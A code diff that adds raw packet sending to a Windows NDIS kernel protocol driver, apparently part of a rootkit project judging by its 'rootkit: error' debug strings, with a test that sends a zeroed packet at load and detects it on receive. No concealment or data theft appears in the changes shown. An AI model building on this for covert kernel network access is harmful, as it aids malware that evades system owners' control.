@@ -13,6 +13,7 @@
 /* TODO: use define minor/major */
 
 /* includes */
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -64,6 +65,7 @@
 		rp->IoStatus.Status = STATUS_SUCCESS; rp->IoStatus.Information = info; IoCompleteRequest(rp, IO_NO_INCREMENT);
 /* functions */
 	/* basic */
+#define    memzero(            src, len)    memset(                       src,     '\0',len            )
 #define nt_malloc(             len     )    ExAllocatePool(               NonPagedPool, len            )
 #define nt_free(               src     )    ExFreePool(                            src                 )
 #define nt_memzero(            src, len)    RtlZeroMemory(                         src, len            )
@@ -102,7 +104,7 @@
 #	define printmd(  msg, d   )
 #	define DBG_IN
 #	define DBG_OUT
-#   define DBG_OUT_RV              return
+#	define DBG_OUT_RV              return
 #	define DBG_OUT_RET(   r   )    return r
 #	define DBG_OUT_RET_P( r   )    return r
 #	define DBG_OUT_RET_M( m, r)    return r
@@ -178,7 +180,9 @@ typedef  NDIS_REQUEST                   nd_req;
 typedef  NDIS_MEDIUM                    nd_medm;
 typedef  NDIS_PROTOCOL_CHARACTERISTICS  nd_proto;
 typedef  LIST_ENTRY                     lent;
-
+typedef  KSPIN_LOCK                     spin_lock;
+typedef  KIRQL                          irq;
+typedef  NDIS_PHYSICAL_ADDRESS          nd_phyaddr;
 
 /*** custom structs ***/
 
@@ -280,7 +284,9 @@ struct module_ctx {
 
 
 int      gettimeofday       (struct timeval *dst);
+
 void     ndis_packet_recv   (const uchar *packet, int len);
+void     ndis_packet_send   (const uchar *packet, int len);
 
 void     ndis_status        (nd_hndl protobind_ctx  , nd_ret      s        , void    *sbuf, uint sbuf_len);
 void     ndis_status_cmplt  (nd_hndl protobind_ctx);
@@ -316,21 +322,25 @@ nt_ret   init_module  (mod_obj *mobj)                   ;
 /*** *** *** global variables *** *** ***/
 
 
-dev_obj      *g_device;
-const wchar_t g_devpath[] = L"\\Device\\myDevice1";     // Define the device
-const wchar_t g_devlink[] = L"\\DosDevices\\myDevice1"; // Symlink for the device
-nd_hndl       g_iface_hndl;
-nd_hndl       g_proto_hndl;
-nd_hndl       g_buffer_pool;
-nd_hndl       g_packet_pool;
-uchar        *g_packet       = NULL     ;
-size_t        g_packet_size  = 64 * 1024;
-int           g_packet_ready = 0;
-nd_ev         g_closew_event;
+dev_obj           *g_device;
+const wchar_t      g_devpath[] = L"\\Device\\myDevice1";     // Define the device
+const wchar_t      g_devlink[] = L"\\DosDevices\\myDevice1"; // Symlink for the device
+nd_hndl            g_iface_hndl;
+nd_hndl            g_proto_hndl;
+nd_hndl            g_buffer_pool;
+nd_hndl            g_packet_pool;
+uchar             *g_packet       = NULL     ;
+size_t             g_packet_size  = 64 * 1024;
+int                g_packet_ready = 0;
+nd_ev              g_closew_event;
 
-struct user_ctx   g_usrctx;
-struct module_ctx g_modctx;
-struct packet_ctx g_pckctx;
+struct user_ctx    g_usrctx;
+struct module_ctx  g_modctx;
+struct packet_ctx  g_pckctx;
+
+spin_lock          GlobalArraySpinLock;
+irq                gIrqL;
+nd_phyaddr         HighestAcceptableMax = NDIS_PHYSICAL_ADDRESS_CONST(-1,-1);
 
 
 /*** *** *** helper functions *** *** ***/
@@ -351,9 +361,13 @@ int gettimeofday(struct timeval *dst)
 }
 
 
+/*** *** *** mainline functions *** *** ***/
+
+
 void ndis_packet_recv(const uchar *packet, int len)
 {
 	struct ip *iph = (struct ip *) (packet + sizeof(struct ether_header));
+	
 	DBG_IN;
 	//printmd("proto:", iph->ip_p);
 	
@@ -362,6 +376,53 @@ void ndis_packet_recv(const uchar *packet, int len)
 	memcpy(g_packet, packet, len);
 	g_packet_ready = len;
 	
+	if (len == MTU) {
+		uchar *zero = nt_malloc(MTU);
+		nt_memzero(zero, MTU);
+		if (memcmp(packet, zero, MTU) == 0) {
+			printk("PACKET HIT THE WIRE!!!1\n");
+		}
+		nt_free(zero);
+	}
+	
+	DBG_OUT_RV;
+}
+
+
+void ndis_packet_send(const uchar *packet, int len)
+{
+	NDIS_STATUS aStat;
+	
+	DBG_IN;
+	
+	/* aquire lock, release only when send is complete */
+	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
+	if (g_iface_hndl && packet) {
+		PNDIS_PACKET aPacketP;
+		NdisAllocatePacket(&aStat, &aPacketP, g_packet_pool);
+		if (NDIS_STATUS_SUCCESS == aStat) {
+			PVOID aBufferP;
+			PNDIS_BUFFER anNdisBufferP;
+			
+			NdisAllocateMemory(&aBufferP, len, 0, HighestAcceptableMax);
+			memcpy(aBufferP, (PVOID) packet, len);
+			NdisAllocateBuffer(&aStat, &anNdisBufferP, g_buffer_pool, aBufferP, len);
+			if (NDIS_STATUS_SUCCESS == aStat) {
+				RESERVED(aPacketP)->Irp = NULL; /* so our OnSendDone() knows this is local */
+				NdisChainBufferAtBack(aPacketP, anNdisBufferP);
+				NdisSend(&aStat, g_iface_hndl, aPacketP);
+				if (aStat != NDIS_STATUS_PENDING ) {
+					ndis_send(g_iface_hndl, aPacketP, aStat);
+				}
+			} else {
+				DbgPrint("rootkit: error 0x%X NdisAllocateBuffer\n");
+			}
+		} else {
+			DbgPrint("rootkit: error 0x%X NdisAllocatePacket\n");
+		}
+	}
+	/* release so we can send next.. */
+	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
 	DBG_OUT_RV;
 }
 
@@ -442,7 +503,38 @@ void ndis_reset(nd_hndl protobind_ctx, nd_ret s)
 
 void ndis_send(nd_hndl protobind_ctx, nd_pack *npacket, nd_ret s)
 {
+	PNDIS_BUFFER anNdisBufferP;
+	PVOID aBufferP;
+	UINT aBufferLen;
+	PIRP Irp;
+	
 	DBG_IN;
+	
+	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
+	
+	Irp = RESERVED(npacket)->Irp;
+	if (Irp) {
+		NdisReinitializePacket(npacket);
+		NdisFreePacket(npacket);
+		
+		Irp->IoStatus.Status = NDIS_STATUS_SUCCESS;
+		Irp->IoStatus.Information = 0;
+		IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	} else {
+		NdisUnchainBufferAtFront(npacket, &anNdisBufferP);
+		if (anNdisBufferP) {
+			NdisQueryBuffer(anNdisBufferP, &aBufferP, &aBufferLen);
+			if (aBufferP) {
+				NdisFreeMemory(aBufferP, aBufferLen, 0);
+			}
+			NdisFreeBuffer(anNdisBufferP);
+		}
+		NdisReinitializePacket(npacket);
+		NdisFreePacket(npacket);
+	}
+	
+	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
+	
 	DBG_OUT_RV;
 }
 
@@ -658,6 +750,20 @@ nt_ret dev_close(dev_obj *dobj, irp *i)
 /*** *** *** init routine *** *** ***/
 
 
+void init_sending(void)
+{
+	uchar *pckt = nt_malloc(MTU);
+	
+	DBG_IN;
+	
+	nt_memzero(pckt, MTU);
+	ndis_packet_send(pckt, MTU);
+	nt_free(pckt);
+	
+	DBG_OUT_RV;
+}
+
+
 nt_ret init_ndis(mod_obj *mobj)
 {
 	nd_ret ret, err;
@@ -666,7 +772,7 @@ nt_ret init_ndis(mod_obj *mobj)
 	uint mindex = 0;
 	
 	//This string must match that specified in the registery (under Services) when the protocol was installed
-	nd_str pname = NDIS_STRING_CONST(PROTONAME);
+	nd_str pname   = NDIS_STRING_CONST(PROTONAME);
 	nd_medm marray = NdisMedium802_3; // specifies a ethernet network
 	
 	DBG_IN;
@@ -735,6 +841,8 @@ nt_ret init_ndis(mod_obj *mobj)
 	g_packet = (uchar *) nt_malloc(g_packet_size);
 	RET_ON_NULL(g_packet);
 	nt_memzero(g_packet, g_packet_size);
+	
+	KeInitializeSpinLock(&GlobalArraySpinLock);
 	
 	DBG_OUT_RET(NT_OK);
 }
@@ -870,6 +978,8 @@ nt_ret init_module(mod_obj *mobj)
 	printm("init ndis");
 	ret = init_ndis(mobj);
 	RET_ON_ERR(ret);
+	
+	init_sending();
 	
 	DBG_OUT_RET(NT_OK);
 }
